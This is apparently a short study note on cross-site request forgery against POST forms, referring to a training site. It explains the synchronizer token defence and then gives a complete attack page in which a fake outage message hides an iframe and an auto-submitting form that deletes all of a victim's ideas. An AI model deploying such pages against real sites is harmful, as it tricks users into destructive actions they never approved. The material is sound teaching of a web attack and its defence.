# CSRF - POST

df

```markup
<form action="/ideas/delete_all" method="post">
  <input type="hidden" name="scope" value="all">
  <button class="button redB" id="delete_button" style="margin: 5px;">Delete All</button>
  <!-- Below line added dynamically to prevent CSRF Attack-->
  <input type="hidden" name="csrf-token" value="uRARsEXKdVjX6iUnQkDcfHiNqvG">
</form>
```

This technique of programmatically inserting random token values in every web page is known as the synchronizer token pattern

The pattern implements the generating of random "challenge" tokens that are associated with the user's current session, which are then verified for the existence and correctness of this token on the server side.

#### Attack page&#x20;

```markup
<html>
<body>
​
<p>We are experiencing some technical problems. Our website is expected to be back online shortly. We apologize for the inconvenience.</p>
​
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='https://tradeidea.codebashing.com/ideas/delete_all' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='scope' value='all'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```

#### Why iframe

To avoid redirection
